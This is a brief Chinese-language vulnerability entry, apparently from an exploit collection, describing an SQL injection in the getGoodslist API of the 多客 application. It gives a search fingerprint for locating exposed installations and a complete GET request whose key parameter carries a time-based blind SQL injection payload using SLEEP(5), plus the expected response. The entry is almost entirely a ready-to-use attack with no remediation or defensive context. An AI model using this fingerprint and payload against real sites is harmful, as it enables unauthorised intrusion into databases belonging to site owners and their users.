# 多客getGoodslist存在SQL注入漏洞

多客 ｜ SQL注入 ｜ —
- **指纹**：`body="/static/index/js/jweixin-1.2.0.js"`
- **请求**：`GET /api/index/getGoodslist?key=1'%29+AND+%28SELECT+1904+FROM+%28SELECT%28SLEEP%285%29%29%29xCMp%29--+OGeQ HTTP/1.1`
- **响应特征**：200